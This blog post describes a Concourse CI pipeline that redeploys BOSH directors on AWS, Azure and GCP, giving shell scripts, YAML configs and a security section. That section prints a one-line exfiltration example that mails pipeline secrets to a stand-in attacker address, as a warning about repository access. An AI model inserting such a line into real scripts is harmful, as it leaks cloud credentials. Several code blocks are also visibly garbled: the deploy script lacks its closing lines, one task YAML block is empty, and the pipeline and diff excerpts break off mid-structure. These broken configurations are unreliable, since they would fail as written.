<p><em>&ldquo;BOSH deploys Concourse, and Concourse deploys BOSH&rdquo; —Cloud Foundry koan</em></p>

<p>A BOSH Director is a VM (virtual machine) orchestrator which is itself a VM.
BOSH solves the problem of keeping its VMs&rsquo; applications (operating systems
(stemcells) and releases) up-to-date with the command, <code>bosh deploy</code>; however,
this begs the question, &ldquo;what keeps the BOSH Director itself up-to-date?&rdquo;.
<sup><a href="#quis" class="alert-link">[Quis custodiet?]</a></sup></p>

<p>We explore using <a href="https://concourse.ci/">Concourse</a>, a Continuous Integration
(CI) server, and
<a href="https://github.com/cloudfoundry/bosh-deployment/">bosh-deployment</a> <sup><a
href="#bosh_up_to_date" class="alert-link">[Updating BOSH]</a></sup>, in order
to create a <a href="https://github.com/cloudfoundry/bosh-deployment/">Concourse
pipeline</a> which updates, in
turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP
(Google Cloud Platform). Updating all three BOSH directors can be accomplished
with a single click. <sup><a href="#one_click" class="alert-link">[One
click]</a></sup> Best of all, our directors are re-deployed with a recent
stemcell, BOSH release, and CPI release.  <sup><a href="#how_recent"
class="alert-link">[How recent?]</a></sup></p>

<h2 id="0-overview">0. Overview</h2>

<p>Our Concourse pipeline is publicly-viewable, and can be seen at
<a href="https://ci.nono.io/teams/main/pipelines/BOSH">https://ci.nono.io/teams/main/pipelines/BOSH</a>. It&rsquo;s a straightforward pipeline
which consists of three jobs, one for each director on each IaaS (Infrastructure
as a Service): bosh-aws.nono.io, bosh-azure.nono.io, and bosh-gce.nono.io.</p>



  <figure class="img-responsive">
      
          <img src="https://user-images.githubusercontent.com/1020675/31297994-0405c082-aa9d-11e7-9669-b8f08852d286.png"  class="img-responsive" />
      
      
  </figure>




<p>Below is a diagram of our Concourse configuration which describes the pipeline
in greater detail. Note that we keep our credentials (e.g our AWS access key and
secret) in LastPass (see items in red), but LastPass is not strictly necessary:
credentials can be embedded directly in the BOSH manifests, can be passed as
variables during the BOSH manifest creation, or can be maintained as files on
the local hard drive.</p>

<h2 id="1-concourse-tasks">1. Concourse Tasks</h2>

<p>To build our Concourse pipeline, we begin with the the smallest configurable
component, the Concourse <a href="https://concourse.ci/running-tasks.html">task</a>.</p>

<p>The Concourse task is often a set of Concourse resources (e.g GitHub
repositories containing BOSH manifests), environment variables (e.g. <code>${IAAS}</code>
(the IaaS to which we&rsquo;re deploying)), and perhaps most importantly, the shell
script which deploys the director.</p>

<h3 id="1-0-concourse-task-shell-script">1.0 Concourse Task Shell Script</h3>

<p>Here is our annotated <a href="https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/ci/tasks/bosh.sh">shell
script</a>
our Concourse tasks use to deploy our BOSH director:</p>

<pre><code class="language-bash">#!/bin/bash

# We abort the script as soon as we hit an error (as soon as a command exits
# with a non-zero exit status)
set -e

# `cunnie-deployments` is the checked-out GitHub repo that contains our BOSH
# manifests and our directors' `-state.json` files; it also contains this
# script (task script) and task definition.
pushd cunnie-deployments

# We invoke the script that generates our BOSH director's manifest, e.g.
# `aws.sh`, `azure.sh`. The output, the BOSH director's manifest, is named
# `bosh-$IAAS.yml`, e.g. `bosh-aws.yml`
bin/$IAAS.sh

# Does ${DEPLOYMENTS_YML} have a complete set of interpolated variables?
# Abort if not (`--var-errs`).
bosh int bosh-$IAAS.yml \
  --var-errs \
  -l &lt;(echo &quot;$DEPLOYMENTS_YML&quot;) \
  -l &lt;(curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml) \
  &gt; /dev/null

# We attempt to deploy our BOSH director. We prepare a git commit message
# regardless whether our attempt succeeds or fails because we need to retain any
# change to the BOSH director's `-state.json` file. This is necessary in cases
# where a deploy proceeds far enough to create a broken director VM, for
# subsequent deploys must be able to destroy the broken director VM in order to
# free up its IP address so that the current deploy will succeed. The crucial
# information needed to destroy the  broken director VM is its VM's ID, which is
# recorded in the `-state.json` file.

# Note that `set -e` does not trigger an abort if the command that returns a
# non-zero exit code is the subject of an `if` block, i.e. `if bosh create-env`;
# this gives us the breathing room to commit our results regardless of whether
# `bosh create-env` succeeded or failed
if bosh create-env bosh-$IAAS.yml \
  -l &lt;(echo &quot;$DEPLOYMENTS_YML&quot;) \
  -l &lt;(curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml); then

# Do we need to commit anything? If a new director hasn't been deployed (most
# often because there's been no change to the manifest, releases, or stemcell),
# then we don't need to commit
if ! git diff --quiet HEAD --; then
  # If we're in this block, then there has been a deployment. Let's set our
  # git author to avoid git's `*** Please tell me who you are.` error.

  # We check out our branch's HEAD because Concourse's git-resource leaves us

  # `master`, but may be set to something else (usually while testing).
  git checkout $DEPLOYMENTS_BRANCH
  git add .
  git commit -m&quot;$GIT_COMMIT_MESSAGE&quot;
fi
popd

# We copy our repo with its new commit to a new directory. The Concourse job,
# after it finishes running this task, will push the new commit to GitHub.
# Note that `cp -R` works as well as `rsync`; we use `rsync` by force of
# habit.

# We exit with the return code of `bosh create-env`; if the deploy failed, then
# this Concourse task failed

(e.g. <code>aws.sh</code>), they were covered in an earlier <a href="http://engineering.pivotal.io/post/bosh-ssl/">blog

<p>Now that we have our task&rsquo;s shell script, we turn our attention to our task&rsquo;s
(YAML) configuration file. It can be viewed on <a href="https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/ci/tasks/bosh.yml">GitHub</a>,
and is displayed below, too:</p>

<pre><code class="language-yaml">---

</code></pre>

<p>Notes:</p>

<p><code>image_resource:</code> We use a custom-built Docker image,
<code>cunnie/fedora-golang-bosh</code>
(<a href="https://hub.docker.com/r/cunnie/fedora-golang-bosh/~/dockerfile/">https://hub.docker.com/r/cunnie/fedora-golang-bosh/~/dockerfile/</a>); but you
may choose to  use your own Docker image; just be sure that the <a href="https://github.com/cloudfoundry/bosh-cli">BOSH
CLI</a> is installed. Our image is fairly
hefty (450 MB), for it has a rich set of tools available to us when we need to
<a href="https://concourse.ci/fly-intercept.html">intercept</a> the container to
troubleshoot a build.</p>

<p><code>inputs:</code> We have two inputs:
<a href="https://github.com/cloudfoundry/bosh-deployment"><code>bosh-deployment</code></a>, a git repo
which contains the manifests and tools necessary to deploy a BOSH director (this
is the canonical way to deploy a BOSH director), and
<a href="https://github.com/cunnie/deployments/"><code>cunnie-deployments</code></a>, a git repo which
contains our BOSH directors&rsquo; manifests and state files. Also, this repo contains
the required Concourse task definition (<code>ci/tasks/bosh.yml</code>) and script
(<code>ci/tasks/bosh.sh</code>).</p>

<p><code>outputs:</code> We have one output, <code>cunnie-deployments-with-state</code>, which is the
same as the input, <code>cunnie-deployments</code>. Concourse prohibits an input from also
being an output, so our script copies the contents of one to the other.
<code>cunnie-deployments-with-state</code> includes the commits made by the task (in the
case of a deploy, the state file and possibly the BOSH director&rsquo;s manifest).
This output is used by a subsequent step in the Concourse job which will push
any git commits to GitHub (although this Concourse <em>task</em> may make git commits,
it won&rsquo;t push them — it leaves that responsibility to the Concourse <em>job</em>).</p>

<p><code>params:</code> <code>DEPLOYMENTS_BRANCH</code> is almost always set to <code>master</code>; it refers to
the branch in the <code>cunnie-deployments</code> repo. <code>IAAS</code> is either <code>aws</code>, <code>azure</code>, or
<code>gce</code>. <code>DEPLOYMENTS_YML</code> is YAML-formatted and contains secrets needed to
deploy; sample contents can be viewed in an earlier <a href="http://engineering.pivotal.io/post/bosh-ssl/#secrets_file">blog
post</a>.</p>

<h2 id="2-concourse-jobs">2. Concourse Jobs</h2>

<p>The Concourse job is straightforward:</p>

<ul>
<li>It checks out the <code>cunnie-deployments</code> and <code>bosh-deployment</code> git repos</li>
<li>It runs the task which deploys the BOSH director to the specified IaaS</li>
<li>It pushes changes to the director manifest (<code>bosh-${IAAS}.yml</code>) and the
director state (<code>bosh-${IAAS}-state.json</code>) to the <code>cunnie-deployments</code> repo
regardless of whether the deploy succeeded or failed (i.e. the <code>ensure</code>
directive)</li>
</ul>

<p>Here is the Concourse job definition which deploys the BOSH director to the AWS
IaaS:</p>

<pre><code class="language-yaml">jobs:
- name: bosh-aws.nono.io
  plan:
  - get: cunnie-deployments
  - get: bosh-deployment
  - task: deploy
    file: cunnie-deployments/ci/tasks/bosh.yml
    params:
      DEPLOYMENTS_BRANCH: master
      DEPLOYMENTS_YML: ((deployments_yml))
      IAAS: aws
    ensure:
      put: cunnie-deployments
      params:
        repository: cunnie-deployments-with-state/
</code></pre>

<h2 id="3-concourse-pipeline">3. Concourse Pipeline</h2>

<p>The full Concourse pipeline (<code>pipeline.yml</code>) can be seen
<a href="https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/ci/pipeline.yml">here</a>.
Below is an abbreviated portion which shows the Concourse resources and the first
job (which deploys the AWS BOSH director):</p>

<pre><code class="language-yaml"># fly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key=&quot;$(lpass show --note github_deployments_key)&quot; -v deployments_yml=&quot;$(lpass show --note deployments.yml)&quot;

jobs:
- name: bosh-aws.nono.io

      DEPLOYMENTS_YML: ((deployments_yml))
      IAAS: aws
    ensure:
      put: cunnie-deployments
      params:
        repository: cunnie-deployments-with-state/
# Other jobs redacted for brevity

  type: git
  source:
    uri: https://github.com/cloudfoundry/bosh-deployment.git
</code></pre>

<p>Notes:</p>

<p>The first line is a convenience comment; it shows the <code>fly</code> (Concourse CLI)
command which updates the Concourse server&rsquo;s pipeline after changes have been
made to the <code>pipeline.yml</code> file. We cut-and-paste that comment into our shell
whenever we make a change to <code>pipeline.yml</code> in order to propagate the changes to
the pipeline to our Concourse server:</p>

<pre><code class="language-bash">fly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key=&quot;$(lpass show --note github_deployments_key)&quot; -v deployments_yml=&quot;$(lpass show --note deployments.yml)&quot;
</code></pre>

<p>We have already discussed <code>deployments_yml</code> (i.e. the Concourse task environment
variable/parameter <code>DEPLOYMENTS_YML</code>), but the other variable,
<code>github_deployments_key</code>, warrants discussion. It is a <a href="https://developer.github.com/v3/guides/managing-deploy-keys/">GitHub deploy
key</a> which allows
our job to push changes to the <code>cunnie-deployments</code> repo
<sup><a href="#interpolation" class="alert-link">[Interpolation]</a></sup> .</p>

<p>We&rsquo;d like to discuss how we stop the pipeline when the deploy of a BOSH director
fails. We use Concourse&rsquo;s <a href="https://concourse.ci/build-plans.html"><code>passed</code></a>
directive. For example, if our deploy of the AWS director fails, we do <em>not</em>
want to deploy the Azure director.</p>

<p>The following shows the <code>diff</code> between the job to deploy the AWS director and
the job to deploy Azure director. Pay special attention to the <code>passed</code> and
<code>trigger</code> directives: the deploy of the Azure director is kicked off if and only
if there has been a successful deploy of the AWS director. This limits the
damage caused by a flawed configuration: only one director is knocked offline
(typically the first one, AWS), not all three.</p>

<pre><code class="language-diff">-- name: bosh-aws.nono.io
+- name: bosh-azure.nono.io
   plan:
   - get: cunnie-deployments

<h2 id="4-security">4. Security</h2>

<div class="alert alert-error" role="alert">

Restrict your Concourse teams to people you trust, don't unnecessarily expose
your pipelines or publish your pipelines' configurations (`.yml` files).
Similarly, restrict access to your GitHub repo which has your director manifests
and Concourse scripts.

</div>

<p>Our credentials are stored in our Concourse pipeline, and they can be easily
revealed by a trusted user with the following command:</p>

<pre><code class="language-bash">fly -t nono get-pipeline -p BOSH
</code></pre>

<p>These credentials include IaaS credentials, which will allow a bad actor to spin
up multiple VMs to run, say, Bitcoin mining. A co-worker of the author whose
credentials were compromised had unauthorized AWS charges exceeding $3k.</p>

<p>It is also important to restrict access to the GitHub repo which contains the
scripts that are run. Although the repo does not contain credentials, it enables
the execution of commands which can reveal the credentials. For example, the
following line of code could be added to the <code>ci/tasks/bosh.sh</code> script to email
the credentials to the bad actor:</p>

<pre><code class="language-bash">echo ${DEPLOYMENTS_YML} | mail -s &quot;secret credentials&quot; bad.actor@mailinator.com
</code></pre>

<h2 id="footnotes">Footnotes</h2>

<p><a name="quis"><sup>[Quis custodiet?]</sup></a> &ldquo;Who updates the VM [BOSH
director] that keeps the other VMs updated?&rdquo; is the question, versions of which
have been asked as long ago as the days of the Roman poet Juvenal, who famously
asked, &ldquo;<a href="https://en.wikipedia.org/wiki/Quis_custodiet_ipsos_custodes%3F">Quis custodiet ipsos
custodes?</a>&rdquo; and
as recently as this century by comic book writer Alan Moore, who phrased it,
&ldquo;Who watches the Watchmen?&rdquo;</p>

<p><a name="how_recent"><sup>[How recent?]</sup></a>
How fresh is <code>bosh-deployment</code>? Fresh.  <code>bosh-deployment</code> is a quite
active git repo, typically updated <a href="https://github.com/cloudfoundry/bosh-deployment/graphs/commit-activity">several times or more each
week</a>.
It&rsquo;s the tool that the BOSH team, and many Cloud Foundry teams, use to keep
their BOSH directors current.</p>

<p><a name="bosh_up_to_date"><sup>[Updating BOSH]</sup></a> In the early days, the
BOSH micro plugin was the mechanism to update the BOSH director. There were
several drawbacks to the micro plugin, one of which is that it forced the BOSH
CLI to have an understanding of the API for various IaaSes, breaking the Cloud
Layer abstraction model.</p>

<p>Another drawback of the BOSH micro plugin was that it was brittle, so much so
that it was a common pattern to deploy a BOSH director whose sole purpose was to
deploy the &ldquo;real&rdquo; BOSH director. &ldquo;Ha!&rdquo; one might ask, &ldquo;But how did you keep that
first BOSH director up-to-date?&rdquo; The answer is simple: you didn&rsquo;t. You left that
first BOSH director running and never touched it except to redeploy the &ldquo;real&rdquo;
BOSH director. You might spin it down if you weren&rsquo;t using it, but you never
deleted it or updated it.</p>

<p>These were serious problems, and to address them the BOSH Core team wrote
<a href="https://github.com/cloudfoundry/docs-bosh/commit/a159cc4f6633ca26d7c9ce1d4ace961b0d1bad20"><code>bosh-init</code></a>,
a Golang-based executable whose purpose was to deploy BOSH directors. It adhered
to the Cloud Layer abstraction models (it used the existing CPIs (Cloud Provider
Interfaces) for the existing IaaSes (<a href="https://github.com/cloudfoundry-incubator/bosh-vsphere-cpi-release">VMware
vSphere</a>,
<a href="https://github.com/cloudfoundry-incubator/bosh-google-cpi-release">Google Cloud
Platform</a>
(GCP),
<a href="https://github.com/cloudfoundry-incubator/bosh-openstack-cpi-release">OpenStack</a>,
<a href="https://github.com/cloudfoundry-incubator/bosh-azure-cpi-release">Microsoft
Azure</a>, among
others)).</p>

<p>By April 30, 2015, <code>bosh-init</code> was production-ready, and the BOSH documentation
was <a href="https://github.com/cloudfoundry/docs-bosh/commit/a159cc4f6633ca26d7c9ce1d4ace961b0d1bad20">updated</a>
to reflect the new world order.</p>

<p>But all was not perfect in the Garden of Eden, for the introduction of
<code>bosh-init</code> split the CLIs: whereas before there was one BOSH CLI, now there
were two: <code>bosh</code>, the original Ruby-based CLI for managing a BOSH director&rsquo;s
deployment, and <code>bosh-init</code> for deploying a BOSH director itself. In many ways
this resembled the <a href="https://en.wikipedia.org/wiki/Western_Schism">Western
Schism</a>, a dark chapter in the
Roman Catholic church when there were two popes (who had the terrible habit of
excommunicating each other). The BOSH development team remedied this situation
by creating a <em>third</em> CLI, the <a href="https://bosh.io/docs/cli-v2.html">Golang-based
CLI</a>. In this regard, the BOSH development
team&rsquo;s approach mirrored the approach attempted by the Catholic cardinals,
who elected a <em>third</em> pope. The BOSH team&rsquo;s approach succeeded, but the
cardinals&rsquo; didn&rsquo;t (they were left with three popes running around
excommunicating each other).</p>

<p><a name="one_click"><sup>[One click]</sup></a> It&rsquo;s technically possible
to kick off the builds with <em>zero</em> clicks — to kick off the build automatically
if, say, a commit is pushed to the <em>bosh-deployment</em> repository. The modification
to the pipeline is trivial:</p>

<pre><code class="language-diff"> - name: bosh-aws.nono.io
   plan:
   - get: cunnie-deployments
   - get: bosh-deployment
+    trigger: true
 - task: deploy
</code></pre>

<p>However, the decision to trigger automatically is not without risks: the BOSH
director may be in the middle of a delicate task, such as updating a deployment,
and won&rsquo;t have the opportunity to gracefully bring itself down, for<code>bosh
create-env</code> is relentless, brooks no delays, and gives no quarter.</p>

<p>On a more technical note, <code>bosh create-env</code>, although it will attempt to contact
the <a href="https://github.com/cloudfoundry/bosh-agent">BOSH agent</a> on the original
BOSH director in order to terminate the jobs and shut down the VM, it does not
run the <a href="https://bosh.io/docs/drain.html">drain scripts</a> (scripts which allow
the BOSH jobs to clean up and get into a state where they can be safely
stopped).</p>

<p>There is discussion within the BOSH development team whether to modify the
behavior of <code>bosh create-env</code> to make it run the drain scripts. On the positive
side, it will allow a more cavalier approach to re-deploying the director, and
make the behavior of <code>bosh create-env</code> more closely approximate the behavior of
a BOSH director. On the downside, the time to deploy a BOSH director may vary
widely, dependent on the time it takes for the drain scripts to complete.</p>

<p><a name="interpolation"><sup>[Interpolation]</sup></a>
Our GitHub deploy key resembles the following (not our real key) <sup><a
href="#ECC" class="alert-link">[Elliptic-curve]</a></sup> :</p>

<pre><code>-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL
AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ
Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw==
-----END EC PRIVATE KEY-----
</code></pre>

<p>Concourse, when passed the flag <code>... -v github_deployments_key=&quot;$(lpass show
--note github_deployments_key)&quot;</code> will interpolate this section of
<code>pipeline.yml</code>:</p>

<pre><code class="language-yaml">type: git
source:
  uri: git@github.com:cunnie/deployments.git
  private_key: ((github_deployments_key))
</code></pre>

<p>After interpolation, the pipeline looks like this:</p>

<pre><code class="language-yaml">- name: cunnie-deployments
  type: git
  source:
    uri: git@github.com:cunnie/deployments.git
    # previously: private_key: ((github_deployments_key))

      Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw==
      -----END EC PRIVATE KEY-----
</code></pre>

<p>If your pipeline is not public, it may be easier to skip variable interpolation
and embed the credential(s) directly.</p>

<p><a name="ECC"><sup>[Elliptic-curve]</sup></a>We use <a href="https://en.wikipedia.org/wiki/Elliptic-curve_cryptography">elliptic-curve
cryptography</a> (ECC)
keys, for they are much shorter than an RSA key of <a href="https://www.globalsign.com/en/blog/elliptic-curve-cryptography/">equivalent
strength</a>, and
thus more manageable. Unfortunately, they are not universally accepted (e.g. AWS
will respond with &ldquo;Error importing Key Pair Key is not in valid OpenSSH public
key format&rdquo; when importing an EC public key).</p>

<p>Where elliptic-curve cryptography is concerned, GitHub is ahead of the
proverbial curve, and AWS, behind.</p>
